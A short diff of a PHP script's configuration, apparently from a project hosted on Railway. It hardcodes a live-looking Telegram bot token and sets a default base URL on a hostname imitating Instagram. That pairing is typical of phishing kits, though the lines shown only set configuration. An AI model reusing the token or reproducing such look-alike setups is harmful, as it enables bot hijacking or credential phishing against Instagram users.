@@ -13,7 +13,7 @@ if (file_exists(__DIR__ . '/.env')) {
 }
 
 $telegram_bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: "8287031383:AAEUkQ0Yk9aiWGiG7_1d4SjIfAgR8msEWBA";
-$base_url = getenv('BASE_URL') ?: "";
+$base_url = getenv('BASE_URL') ?: "https://instagram-www.up.railway.app";
 
 if (empty($base_url)) {
     die("❌ Error: BASE_URL environment variable not set!\n\nSet it in Railway Variables or .env file.\n\nExample: BASE_URL=https://your-app.railway.app");
